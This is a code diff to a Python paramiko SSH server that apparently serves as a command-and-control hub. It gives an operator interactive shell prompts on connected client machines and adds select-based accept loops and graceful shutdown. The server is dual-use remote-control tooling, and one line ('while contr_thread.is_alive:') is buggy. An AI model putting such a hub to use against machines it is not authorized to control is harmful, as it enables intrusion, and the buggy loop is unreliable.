@@ -3,6 +3,8 @@ import paramiko
 import threading
 import sys
 import threading
+import select
+import time
 
 #script args
 server_address = "0.0.0.0"
@@ -14,6 +16,7 @@ contr_password = sys.argv[4]
 server_host_key = paramiko.RSAKey(filename="./ssh_server.key")
 
 connected_clients = []
+running = threading.Event()
 
 class ContrServer(paramiko.ServerInterface):
     def __init__(self):
@@ -54,6 +57,7 @@ def client_handler(client_no):
     global connected_clients
     _, client_ssh_session, client_ssh_channel = connected_clients[client_no]
     while not client_ssh_channel.closed:
+        if not running.is_set(): raise KeyboardInterrupt
         command = input(f"{get_client_path(client_no)}:#> ").rstrip()
         if len(command):
             if command != "exit":
@@ -73,6 +77,7 @@ def client_handler(client_no):
 
 def contr_handler(contr_ssh_session, contr_ssh_channel):
     while not contr_ssh_channel.closed:
+        if not running.is_set(): raise KeyboardInterrupt
         command = contr_ssh_channel.recv(1024).decode('utf-8').split(" ")
         if command[0] == "getdir" and len(command[1]):
             try: contr_ssh_channel.send(get_client_path(int(command[1])))
@@ -114,6 +119,8 @@ def client():
     #Keep ssh server active and accept incoming tcp connections
     while True:
         try:
+            while not select.select([clients_socket], [], [], 1)[0]:
+                if not running.is_set(): raise KeyboardInterrupt
             client_socket, addr = clients_socket.accept()
             # print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
             client_ssh_session = paramiko.Transport(client_socket)
@@ -163,6 +170,8 @@ def controller():
 
     while True:
         try:
+            while not select.select([contrs_socket], [], [], 1)[0]:
+                if not running.is_set(): raise KeyboardInterrupt
             contr_socket, addr = contrs_socket.accept()
             # print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
             contr_ssh_session = paramiko.Transport(contr_socket)
@@ -209,8 +218,15 @@ def controller():
             sys.exit(1)
 
 if __name__ == "__main__":
+    running.set()
     client_thread = threading.Thread(target = client, daemon = True)
     client_thread.start()
     contr_thread = threading.Thread(target = controller)
     contr_thread.start()
-    contr_thread.join()
+    while contr_thread.is_alive:
+        try:
+            time.sleep(.1)
+        except KeyboardInterrupt:
+            running.clear()
+            contr_thread.join()
+            sys.exit()
